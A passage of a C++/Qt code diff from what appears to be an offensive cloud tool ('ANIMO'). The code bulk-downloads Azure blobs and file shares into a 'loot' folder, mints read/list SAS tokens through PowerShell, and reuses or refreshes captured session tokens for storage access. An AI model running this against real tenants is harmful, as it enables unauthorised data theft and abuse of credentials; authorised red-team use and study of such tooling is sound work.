+        if (dir.isEmpty()) return;
+        appendLog(QString("[*] Bulk downloading %1 file(s) to %2...").arg(blobs.size()).arg(dir), "cyan");
+        for (QTreeWidgetItem *it : blobs) {
+            const QString container = it->parent()->text(0);
+            const QString name = it->text(0);
+            currentStorageAccount = accountForItem(it);
+            const QString url = QString("%1/%2/%3").arg(accountHost(), container, name);
+            const QString outPath = QDir(dir).filePath(name.split('/').last());
+            QNetworkReply *reply = track(net->get(dataRequest(url)));
+            if (!reply) continue;
+            connect(reply, &QNetworkReply::finished, this, [this, reply, outPath, name]() {
+                reply->deleteLater();
+                activeReplies.removeOne(reply);
+                QString err;
+                if (!NetworkHelper::isReplySuccess(reply, &err)) {
+                    appendLog(QString("[-] %1: %2").arg(name, NetworkHelper::parseApiError(reply)), "red");
+                    return;
+                }
+                QFile f(outPath);
+                if (f.open(QIODevice::WriteOnly)) { f.write(reply->readAll()); f.close(); appendLog(QString("[+] %1").arg(name), "green"); }
+                else appendLog(QString("[-] Could not write %1").arg(outPath), "red");
+            });
+        }
+    };
+
+    if (hasStorageToken()) { doRestBulk(); return; }
+    acquireStorageToken([this, doRestBulk, blobs](bool ok) {
+        if (ok) { doRestBulk(); return; }
+        appendLog(QString("[*] Bulk downloading %1 file(s) to ./loot on the ANIMO host...").arg(blobs.size()), "cyan");
+        for (QTreeWidgetItem *it : blobs) {
+            const QString container = it->parent()->text(0);
+            const QString name = it->text(0);
+            currentStorageAccount = accountForItem(it);
+            const bool file = serviceCombo->currentText().startsWith("File");
+            const QString getCmd = file
+                ? QString("Get-AzStorageFileContent -ShareName '%1' -Path '%2' -Destination 'loot' -Force -Context $ctx")
+                      .arg(container, name)
+                : QString("Get-AzStorageBlobContent -Container '%1' -Blob '%2' -Destination 'loot' -Force -Context $ctx")
+                      .arg(container, name);
+            runPs(QString("New-Item -ItemType Directory -Force -Path loot | Out-Null; %1; %2")
+                      .arg(psContextSetup(), getCmd),
+                  [this, name](bool ok, const QString &out) {
+                      appendLog(ok ? QString("[+] %1").arg(name) : QString("[-] %1: %2").arg(name, out.trimmed()),
+                                ok ? "green" : "red");
+                  });
+        }
+    });
+}
+
+void AzureStorageWindow::generateSas() {
     auto *item = storageTree->currentItem();
-    if (!item) {
-        QMessageBox::information(this, "No Selection", "Please select a blob.");
+    currentStorageAccount = accountForItem(item);
+    if (currentStorageAccount.isEmpty()) { QMessageBox::warning(this, "No account", "Enter a storage account."); return; }
+    if (!psAvailable()) {
+        QMessageBox::information(this, "PowerShell needed", "SAS generation uses Az.Storage in the selected session.");
         return;
     }
-
-    QString type = item->data(0, Qt::UserRole).toString();
-    QString url;
-
-    if (type == "container") {
-        url = QString("https://%1.blob.core.windows.net/%2")
-                  .arg(currentStorageAccount, item->text(0));
-    } else if (type == "blob") {
-        QTreeWidgetItem *parent = item->parent();
-        if (!parent) return;
-        url = QString("https://%1.blob.core.windows.net/%2/%3")
-                  .arg(currentStorageAccount, parent->text(0), item->text(0));
+    QString cmd;
+    if (item && item->data(0, Qt::UserRole).toString() == "container") {
+        cmd = QString("New-AzStorageContainerSASToken -Name '%1' -Permission rl -ExpiryTime (Get-Date).AddHours(2) -Context $ctx")
+                  .arg(item->text(0));
     } else {
-        return;
+        cmd = "New-AzStorageAccountSASToken -Service Blob,File -ResourceType Service,Container,Object "
+              "-Permission rl -ExpiryTime (Get-Date).AddHours(2) -Context $ctx";
     }
+    appendLog("[*] Generating SAS via PowerShell...", "cyan");
+    runPs(QString("%1; %2").arg(psContextSetup(), cmd), [this](bool ok, const QString &out) {
+        const QString sas = out.trimmed();
+        if (ok && sas.contains("sig=")) {
+            sasInput->setText(sas.startsWith('?') ? sas : "?" + sas);
+            appendLog(QString("[+] SAS generated and placed in the SAS field: %1").arg(sas.left(40) + "..."), "green");
+        } else {
+            appendLog("[-] SAS generation failed (needs an account-key context):", "red");
+            appendLog(sas, "gray");
+        }
+    });
+}
 
+void AzureStorageWindow::copyUrl() {
+    auto *item = storageTree->currentItem();
+    if (!item) { QMessageBox::information(this, "No selection", "Select a container or blob."); return; }
+    currentStorageAccount = accountForItem(item);
+    const QString type = item->data(0, Qt::UserRole).toString();
+    QString url;
+    if (type == "container") url = QString("%1/%2").arg(accountHost(), item->text(0));
+    else if (type == "blob" && item->parent()) url = QString("%1/%2/%3").arg(accountHost(), item->parent()->text(0), item->text(0));
+    else return;
     QApplication::clipboard()->setText(url);
     appendLog("[+] URL copied to clipboard", "green");
 }
 
-void AzureStorageWindow::setLoading(bool loading) {
-    progressBar->setVisible(loading);
-    listAccountsBtn->setEnabled(!loading);
-    listContainersBtn->setEnabled(!loading && storageAccountCombo->currentIndex() >= 0);
-    cancelBtn->setEnabled(loading);
-    if (!loading) {
-        cancelRequested = false;
-    }
-}
-
-void AzureStorageWindow::onUserChanged(const QString &upn) {
-    mgmtTokenInput->clear();
-    storageTokenInput->clear();
-    if (upn.isEmpty()) {
-        updateTokenStatus();
-        return;
-    }
-    QString mgmtToken = userSelector->getExistingToken(TokenHelper::RESOURCE_MANAGEMENT);
-    QString storageToken = userSelector->getExistingToken(TokenHelper::RESOURCE_STORAGE);
-    if (!mgmtToken.isEmpty()) {
-        mgmtTokenInput->setText(mgmtToken);
-        appendLog("Found existing Management token", "lime");
-    }
-    if (!storageToken.isEmpty()) {
-        storageTokenInput->setText(storageToken);
-        appendLog("Found existing Storage token", "lime");
-    }
-    updateTokenStatus();
-}
+// ============================================================================
+// Tokens / status / misc
+// ============================================================================
 
 void AzureStorageWindow::autoFetchTokens() {
-    if (!userSelector->hasSelection()) {
-        QMessageBox::warning(this, "No User Selected", "Please select a user from the dropdown first.");
+    // No-op: session auth is handled by Connect-AzAccount at login time.
+    // The session's credential context provides storage access directly.
+    appendLog("[*] Session uses connected-account auth. No separate token fetch needed.", "cyan");
+}
+
+void AzureStorageWindow::onUserChanged(const QString &) {
+    storageTree->clear();
+    storageTokenInput->clear();
+    const QString sid = userSelector->selectedSession();
+    if (sid.isEmpty()) return;
+
+    // Check if we already have a storage token cached
+    TokenInfo st = TokenStore::instance()->getTokenForSessionAndResource(sid, QStringLiteral("https://storage.azure.com"));
+    if (!st.accessToken.isEmpty()) {
+        storageTokenInput->setText(st.accessToken);
+        appendLog("[+] Storage token available for this session", "lime");
         return;
     }
-    appendLog(QString("Fetching tokens for user: %1").arg(userSelector->selectedUser()), "cyan");
-    setLoading(true);
-    autoFetchBtn->setEnabled(false);
-
-    QStringList resources = {TokenHelper::RESOURCE_MANAGEMENT, TokenHelper::RESOURCE_STORAGE};
-    userSelector->fetchTokens(resources,
-        [this](bool success, const QMap<QString, QString> &tokens, const QString &error) {
-            setLoading(false);
-            autoFetchBtn->setEnabled(true);
-            if (!success && tokens.isEmpty()) {
-                appendLog("Failed: " + error, "red");
-                QMessageBox::warning(this, "Token Fetch Failed", error);
-                return;
-            }
-            if (tokens.contains(TokenHelper::RESOURCE_MANAGEMENT)) {
-                mgmtTokenInput->setText(tokens[TokenHelper::RESOURCE_MANAGEMENT]);
-                appendLog("Management token acquired", "lime");
-            }
-            if (tokens.contains(TokenHelper::RESOURCE_STORAGE)) {
-                storageTokenInput->setText(tokens[TokenHelper::RESOURCE_STORAGE]);
-                appendLog("Storage token acquired", "lime");
-            }
-            updateTokenStatus();
-            if (!error.isEmpty()) appendLog("Some tokens failed: " + error, "orange");
-        });
+    // No cached token - try to exchange the session's refresh token
+    acquireStorageToken();
 }
 
 void AzureStorageWindow::updateTokenStatus() {
-    auto getAudience = [](const QString &token) -> QString {
-        QStringList parts = token.split('.');
-        if (parts.size() < 2) return QString();
-        QByteArray payload = parts.at(1).toUtf8();
-        int pad = (4 - (payload.size() % 4)) % 4;
-        payload.append(QByteArray(pad, '='));
-        payload = QByteArray::fromBase64(payload, QByteArray::Base64UrlEncoding);
-        return QJsonDocument::fromJson(payload).object().value("aud").toString();
-    };
+    // No visible token fields to update
+}
 
-    QString mgmtToken = mgmtTokenInput->text().trimmed();
-    if (mgmtToken.isEmpty()) {
-        mgmtTokenStatus->setText("<span style='color:gray'>Empty</span>");
-    } else {
-        QString aud = getAudience(mgmtToken);
-        mgmtTokenStatus->setText(aud.contains("management.azure.com", Qt::CaseInsensitive)
-            ? "<span style='color:lime'>Valid</span>" : "<span style='color:orange'>Wrong</span>");
-    }
-
-    QString storageToken = storageTokenInput->text().trimmed();
-    if (storageToken.isEmpty()) {
-        storageTokenStatus->setText("<span style='color:gray'>Empty</span>");
-    } else {
-        QString aud = getAudience(storageToken);
-        storageTokenStatus->setText(aud.contains("storage.azure.com", Qt::CaseInsensitive)
-            ? "<span style='color:lime'>Valid</span>" : "<span style='color:orange'>Wrong</span>");
-    }
+void AzureStorageWindow::setLoading(bool loading) {
+    progressBar->setVisible(loading);
+    listContainersBtn->setEnabled(!loading);
+    listBlobsBtn->setEnabled(!loading);
+    listAccountsBtn->setEnabled(!loading);
+    cancelBtn->setEnabled(loading);
+    if (!loading) cancelRequested = false;
 }
 
 void AzureStorageWindow::cancelRequests() {
     cancelRequested = true;
     appendLog("[!] Cancelling requests...", "yellow");
-    for (QNetworkReply *reply : activeReplies) {
-        if (reply && !reply->isFinished()) {
-            reply->abort();
-        }
-    }
+    for (QNetworkReply *reply : activeReplies)
+        if (reply && !reply->isFinished()) reply->abort();
     activeReplies.clear();
     setLoading(false);
-    appendLog("[*] Requests cancelled", "yellow");
 }
